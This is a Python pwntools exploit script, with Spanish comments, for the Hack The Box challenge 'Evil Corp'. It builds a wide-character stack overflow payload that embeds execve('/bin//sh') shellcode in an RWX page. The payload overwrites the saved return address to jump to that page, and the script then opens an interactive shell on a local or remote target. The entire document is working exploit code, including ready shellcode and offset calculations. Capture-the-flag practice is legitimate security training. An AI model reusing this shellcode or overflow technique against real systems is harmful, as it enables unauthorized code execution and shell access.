#!/usr/bin/env python3
# =============================================================
#  full_test.py - Evil Corp (Hack The Box)
# =============================================================

import argparse
import os

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'

# Setup():
#   SupportMsg       = mmap(0x10000, 0x4b0, 3, 0x4032)  rw-
#   AssemblyTestPage = mmap(0x11000, 0x800, 7, 0x4032)  rwx, MAP_FIXED
SUPPORT_MSG = 0x10000
RWX         = 0x11000

# ContactSupport():
#   0010175a  SUB RSP,0x3e80   buffer de 16000 bytes
#   00101759  PUSH RBX         8 bytes antes del saved RIP
BUF_BYTES = 0x3e80
PUSH_RBX  = 8

BINARY = "bin/evil-corp"  # binario local cuando no se pasa --host

# wcharToChar16 escribe 2 bytes por elemento  -> 4096 / 2 = 2048
SHELLCODE_START = (RWX - SUPPORT_MSG) // 2

# la pila usa wchar_t de 4 bytes             -> 16008 / 4 = 4002
RET_INDEX = (BUF_BYTES + PUSH_RBX) // 4

# execve("/bin//sh")
SHELLCODE = bytes.fromhex(
    "4831c050"
    "48bb2f62696e2f2f7368"
    "53"
    "4889e7"
    "50"
    "57"
    "4889e6"
    "4831d2"
    "4831c0"
    "b03b"
    "0f05"
)


def build_payload():
    words = []

    # relleno hasta la página ejecutable
    words += [0x0101] * SHELLCODE_START

    # shellcode empaquetado, 2 bytes por wchar
    sc = SHELLCODE + (b"\x00" if len(SHELLCODE) % 2 else b"")
    for i in range(0, len(sc), 2):
        words.append(sc[i] | (sc[i + 1] << 8))

    # terminador de la copia
    words.append(0)

    # relleno hasta el saved RIP
    words += [0x0101] * (RET_INDEX - len(words))

    # saved RIP = dirección de la página ejecutable
    words.append(RWX)

    # mitad alta de la dirección en cero
    words.append(0)

    return ''.join(chr(w) for w in words).encode('utf-8')


def main():
    parser = argparse.ArgumentParser(description="Exploit de Evil Corp.")
    parser.add_argument("--host", help="IP:PUERTO de la instancia")
    args = parser.parse_args()

    payload = build_payload()

    print(f"SHELLCODE_START = {SHELLCODE_START}")
    print(f"RET_INDEX       = {RET_INDEX}")
    print(f"payload         = {len(payload)} bytes")

    if args.host:
        ip, _, puerto = args.host.split("://")[-1].partition(":")
        io = remote(ip, int(puerto))
    else:
        binary = os.path.join(os.path.dirname(os.path.abspath(__file__)), BINARY)
        io = process(binary, cwd=os.path.dirname(binary))

    io.sendline(b"eliot")
    io.sendline(b"4007")

    io.sendline(b"2")

    io.send(payload + b"\n")

    io.interactive()


if __name__ == "__main__":
    main()
